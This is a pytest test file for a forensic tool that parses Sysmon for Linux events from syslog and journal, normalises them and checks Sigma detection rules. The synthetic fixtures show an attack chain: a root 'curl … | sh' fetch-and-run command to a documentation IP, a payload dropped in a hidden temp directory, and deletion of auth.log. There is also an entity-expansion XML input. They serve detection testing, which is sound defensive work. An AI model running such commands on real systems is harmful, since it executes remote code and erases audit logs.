"""Sysmon for Linux events in syslog / journal. Hosts, users and addresses are synthetic."""
from __future__ import annotations

import time
from unittest.mock import MagicMock

import pytest
import yaml

from app.core import opensearch as os_module
from app.ingest.artifact_normalizers import normalize_linux_row
from app.ingest.linux.journal import _row_from_fields
from app.ingest.linux.sysmon_linux import looks_like_sysmon_event, parse_sysmon_event
from app.ingest.linux.syslog import parse_syslog
from app.ingest.normalizer import base_document
from app.rules_engine.sigma import build_sigma_case_profile, compile_sigma_rule, evaluate_compiled_sigma_rule, preflight_sigma_rule


def _event(code: int, data: dict[str, str], *, stamp: str = "2024-03-01T10:20:30.123456789Z", computer: str = "web01") -> str:
    items = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (
        f'<Event><System><Provider Name="Linux-Sysmon" Guid="{{abc}}"/><EventID>{code}</EventID><Version>5</Version>'
        f'<TimeCreated SystemTime="{stamp}"/><Channel>Linux-Sysmon/Operational</Channel><Computer>{computer}</Computer></System>'
        f"<EventData>{items}</EventData></Event>"
    )


PROCESS = _event(1, {
    "RuleName": "-", "UtcTime": "2024-03-01 10:20:30.123", "ProcessGuid": "{aaa}", "ProcessId": "1234",
    "Image": "/usr/bin/curl", "CommandLine": "curl -s &quot;http://203.0.113.9/x&quot; | sh", "CurrentDirectory": "/root",
    "User": "root", "Hashes": "SHA256=" + "ab" * 32 + ",MD5=00", "ParentProcessGuid": "{bbb}", "ParentProcessId": "1000",
    "ParentImage": "/bin/bash", "ParentCommandLine": "bash -i", "ParentUser": "root",
})
NETWORK = _event(3, {
    "Image": "/usr/bin/curl", "User": "root", "Protocol": "tcp", "Initiated": "true", "SourceIp": "192.0.2.10", "SourcePort": "51234",
    "DestinationIp": "203.0.113.9", "DestinationPort": "80", "DestinationHostname": "-", "ProcessId": "1234",
}, stamp="2024-03-01T10:20:31.000Z")
FILE_CREATE = _event(11, {"Image": "/usr/bin/wget", "TargetFilename": "/tmp/.x/payload.sh", "User": "root", "ProcessId": "77"}, stamp="2024-03-01T10:20:32.000Z")
FILE_DELETE = _event(23, {"Image": "/bin/rm", "TargetFilename": "/var/log/auth.log", "User": "root", "ProcessId": "78"}, stamp="2024-03-01T10:20:33.000Z")
TERMINATE = _event(5, {"Image": "/usr/bin/curl", "ProcessId": "1234"}, stamp="2024-03-01T10:20:34.000Z")


def _syslog_line(xml: str) -> str:
    return f"Mar  1 10:20:30 web01 sysmon: {xml}"


def _doc(row: dict) -> dict:
    base = base_document("case-1", "ev-1", "art-1", row, {"artifact_type": row["artifact_family"]})
    return normalize_linux_row(base, row, source_path=row.get("source_file") or row.get("source_path", ""), artifact_type=row["artifact_family"])


def _sysmon_docs(*events: str) -> list[dict]:
    return [_doc(r) for r in parse_syslog("\n".join(_syslog_line(e) for e in events), source_path="var/log/syslog")]


def _fires(rule_text: str, doc: dict) -> bool:
    compiled = compile_sigma_rule(yaml.safe_load(rule_text))
    assert compiled["compile_status"] == "compiled", compiled.get("compile_error")
    return bool(evaluate_compiled_sigma_rule(compiled, doc)["matched"])


# -------------------------------------------------------------------- extraction

def test_process_created():
    e = parse_sysmon_event(PROCESS)
    assert (e["sysmon_event_id"], e["event_label"]) == (1, "sysmon_process_created")
    assert (e["image"], e["process"], e["pid"], e["username"]) == ("/usr/bin/curl", "curl", 1234, "root")
    assert e["command_line"] == 'curl -s "http://203.0.113.9/x" | sh'  # XML entities decoded
    assert (e["parent_image"], e["parent_command_line"], e["parent_pid"]) == ("/bin/bash", "bash -i", 1000)
    assert (e["process_guid"], e["parent_guid"], e["current_directory"]) == ("{aaa}", "{bbb}", "/root")
    assert e["sha256"] == "ab" * 32
    assert e["host"] == "web01"
    assert e["message"] == 'Process created: curl -s "http://203.0.113.9/x" | sh (parent /bin/bash)'


def test_the_event_time_is_exact_and_beats_the_syslog_header():
    e = parse_sysmon_event(PROCESS)
    assert e["timestamp"] == "2024-03-01T10:20:30.123456+00:00" and e["timestamp_status"] == "ok"


def test_the_utc_time_field_is_the_fallback():
    xml = PROCESS.replace('<TimeCreated SystemTime="2024-03-01T10:20:30.123456789Z"/>', "")
    assert parse_sysmon_event(xml)["timestamp"] == "2024-03-01T10:20:30.123000+00:00"


def test_network_connection():
    e = parse_sysmon_event(NETWORK)
    assert (e["sysmon_event_id"], e["event_label"]) == (3, "sysmon_network_connection")
    assert (e["source_ip"], e["source_port"], e["destination_ip"], e["destination_port"], e["network_protocol"]) == ("192.0.2.10", 51234, "203.0.113.9", 80, "tcp")
    assert e["initiated"] is True and e["message"] == "Network connection -> 203.0.113.9:80 by /usr/bin/curl"


def test_file_events_and_terminate():
    created, deleted, ended = (parse_sysmon_event(x) for x in (FILE_CREATE, FILE_DELETE, TERMINATE))
    assert (created["event_label"], created["target_filename"]) == ("sysmon_file_created", "/tmp/.x/payload.sh")
    assert (deleted["event_label"], deleted["target_filename"]) == ("sysmon_file_deleted", "/var/log/auth.log")
    assert ended["event_label"] == "sysmon_process_terminated"


def test_an_unlisted_event_id_is_still_extracted():
    e = parse_sysmon_event(_event(99, {"Image": "/usr/bin/x"}))
    assert e["sysmon_event_id"] == 99 and e["event_label"] == "sysmon_event_99" and e["message"] == "Sysmon event 99: /usr/bin/x"


@pytest.mark.parametrize("text", ["plain syslog text", "<Event>no marker</Event>", "Linux-Sysmon but not xml", "<Event>Linux-Sysmon</Event>", ""])
def test_other_text_is_not_a_sysmon_event(text):
    assert parse_sysmon_event(text) is None


def test_a_placeholder_dash_is_not_a_value():
    e = parse_sysmon_event(_event(1, {"Image": "/bin/ls", "ParentImage": "-", "CommandLine": "(null)"}))
    assert not e.get("parent_image") and not e.get("command_line")


# --------------------------------------------------------- hostile / odd input

def test_entities_are_not_expanded_into_anything_but_their_text():
    bomb = '<!DOCTYPE x [<!ENTITY a "AAAA"><!ENTITY b "&a;&a;&a;&a;">]>' + _event(1, {"Image": "/bin/ls", "CommandLine": "&b; &lol; &#x41;"})
    e = parse_sysmon_event(bomb)
    assert e["command_line"] == "&b; &lol; A"


def test_a_huge_event_is_bounded():
    xml = _event(1, {"Image": "/bin/x", "CommandLine": "A" * 5_000_000})
    started = time.monotonic()
    e = parse_sysmon_event(xml)
    assert time.monotonic() - started < 2
    assert e is None or len(e["command_line"]) <= 4000


def test_a_cut_off_event_keeps_what_was_readable():
    cut = PROCESS[: PROCESS.index("<Data Name=\"ParentProcessGuid\">")]
    e = parse_sysmon_event(cut)
    assert e["image"] == "/usr/bin/curl" and e["pid"] == 1234 and not e.get("parent_image")


def test_the_data_item_count_is_capped():
    xml = _event(1, {f"K{i}": "v" for i in range(500)} | {"Image": "/bin/x"})
    assert parse_sysmon_event(xml) is not None


def test_marker_check():
    assert looks_like_sysmon_event(PROCESS) and not looks_like_sysmon_event("<Event>other</Event>")


# --------------------------------------------------------------- the parsers

def test_syslog_rows_carry_the_event_and_the_original_line():
    row = parse_syslog(_syslog_line(PROCESS), source_path="var/log/syslog")[0]
    assert row["sysmon_event_id"] == 1 and row["image"] == "/usr/bin/curl"
    assert row["message"].startswith("Process created: ")
    assert row["raw_excerpt"].startswith("Mar  1 10:20:30 web01 sysmon: <Event>")
    assert row["host"] == "web01" and row["process"] == "curl"


def test_a_long_event_is_parsed_even_though_the_stored_text_is_clipped():
    long_xml = _event(1, {"Image": "/usr/bin/python3", "CommandLine": "python3 -c " + "x" * 3000, "ParentImage": "/bin/bash", "User": "root"})
    assert len(long_xml) > 2000
    row = parse_syslog(_syslog_line(long_xml), source_path="var/log/syslog")[0]
    assert row["image"] == "/usr/bin/python3" and row["parent_image"] == "/bin/bash" and row["username"] == "root"
    assert len(row["raw_excerpt"]) <= 2000


def test_ordinary_syslog_lines_are_untouched():
    row = parse_syslog("Mar  1 10:20:30 web01 sshd[411]: Accepted publickey for deploy", source_path="var/log/syslog")[0]
    assert "sysmon_event_id" not in row and row["message"] == "Accepted publickey for deploy"


def test_journal_rows_are_enriched_too():
    row = _row_from_fields({"MESSAGE": PROCESS, "SYSLOG_IDENTIFIER": "sysmon", "__REALTIME_TIMESTAMP": "1709288430000000"}, "j.export")
    assert row["sysmon_event_id"] == 1 and row["timestamp"] == "2024-03-01T10:20:30.123456+00:00"


# ------------------------------------------------------------------- normalizing

def test_process_created_fills_the_standard_process_fields():
    doc = _sysmon_docs(PROCESS)[0]
    process = doc["process"]
    assert (process["name"], process["path"], process["executable"], process["pid"]) == ("curl", "/usr/bin/curl", "/usr/bin/curl", 1234)
    assert process["command_line"] == 'curl -s "http://203.0.113.9/x" | sh'
    assert (process["parent_path"], process["parent_name"], process["parent_command_line"], process["ppid"]) == ("/bin/bash", "bash", "bash -i", 1000)
    assert (process["entity_id"], process["parent_entity_id"]) == ("{aaa}", "{bbb}")
    assert process["hashes"]["sha256"] == "ab" * 32 and process["current_directory"] == "/root"
    assert doc["user"]["name"] == "root"
    assert (doc["event"]["code"], doc["event"]["type"], doc["event"]["action"]) == ("1", "sysmon_process_created", "sysmon_process_created")
    assert doc["title"].startswith("Process created: ") and doc["@timestamp"].startswith("2024-03-01T10:20:30")


def test_network_connection_fills_the_network_fields():
    doc = _sysmon_docs(NETWORK)[0]
    assert (doc["network"]["source_ip"], doc["network"]["destination_ip"], doc["network"]["destination_port"], doc["network"]["protocol"]) == ("192.0.2.10", "203.0.113.9", 80, "tcp")
    assert (doc["destination"]["ip"], doc["destination"]["port"]) == ("203.0.113.9", 80)
    assert doc["event"]["code"] == "3"


def test_file_events_fill_the_file_path():
    created, deleted = _sysmon_docs(FILE_CREATE, FILE_DELETE)
    assert (created["file"]["path"], created["file"]["name"]) == ("/tmp/.x/payload.sh", "payload.sh")
    assert deleted["file"]["path"] == "/var/log/auth.log" and deleted["event"]["code"] == "23"


def test_linux_fields_for_search():
    linux = _sysmon_docs(PROCESS)[0]["linux"]
    assert linux["sysmon_event_id"] == 1 and linux["sysmon_event"] == "process_created" and linux["exe"] == "/usr/bin/curl"


# ------------------------------------------------------------- Sigma end to end

PROCESS_RULE = """
title: curl piping to a shell
logsource: {category: process_creation, product: linux}
detection:
  selection:
    Image|endswith: '/curl'
    CommandLine|contains: '| sh'
    ParentImage|endswith: '/bash'
    User: 'root'
  condition: selection
"""
NETWORK_RULE = """
title: outbound connection to a documentation address on port 80
logsource: {category: network_connection, product: linux}
detection:
  selection:
    Image|endswith: '/curl'
    DestinationIp: '203.0.113.9'
    DestinationPort: 80
  condition: selection
"""
FILE_RULE = """
title: file written under a hidden temp directory
logsource: {category: file_event, product: linux}
detection:
  selection:
    TargetFilename|contains: '/tmp/.'
  condition: selection
"""


def test_a_process_creation_rule_fires_on_the_real_process_fields():
    process, network = _sysmon_docs(PROCESS, NETWORK)
    assert _fires(PROCESS_RULE, process) is True
    assert _fires(PROCESS_RULE, network) is False


def test_a_network_connection_rule_fires():
    process, network = _sysmon_docs(PROCESS, NETWORK)
    assert _fires(NETWORK_RULE, network) is True
    assert _fires(NETWORK_RULE, process) is False


def test_a_file_event_rule_fires_on_the_created_file_only():
    created, deleted = _sysmon_docs(FILE_CREATE, FILE_DELETE)
    assert _fires(FILE_RULE, created) is True
    assert _fires(FILE_RULE, deleted) is False


def test_a_process_termination_is_not_a_process_creation():
    ended = _sysmon_docs(TERMINATE)[0]
    assert _fires(PROCESS_RULE.replace("    CommandLine|contains: '| sh'\n", "").replace("    ParentImage|endswith: '/bash'\n", "").replace("    User: 'root'\n", ""), ended) is False


@pytest.mark.parametrize("rule", [PROCESS_RULE, NETWORK_RULE, FILE_RULE])
def test_the_case_preflight_lets_these_rules_run(rule):
    docs = _sysmon_docs(PROCESS, NETWORK, FILE_CREATE)
    status = preflight_sigma_rule(yaml.safe_load(rule), build_sigma_case_profile(docs))
    assert status["status"].startswith("runnable"), status


# ---------------------------------------------------------------- index mapping

@pytest.mark.parametrize("exists", [False, True], ids=["new-index", "existing-index-backfill"])
def test_sysmon_fields_are_declared_in_the_index_mapping(monkeypatch, exists):
    client = MagicMock()
    monkeypatch.setattr(os_module, "get_opensearch_client", lambda **_: client)
    monkeypatch.setattr(os_module, "index_exists", lambda *_a, **_k: exists)
    monkeypatch.setattr(os_module, "_apply_safe_index_settings", lambda *_a, **_k: None, raising=False)
    os_module.ensure_case_index("11111111-1111-4111-8111-111111111111")
    call = client.indices.put_mapping if exists else client.indices.create
    body = call.call_args.kwargs["body"]
    assert {"sysmon_event_id", "sysmon_event"} <= set(body.get("mappings", body)["properties"]["linux"]["properties"])
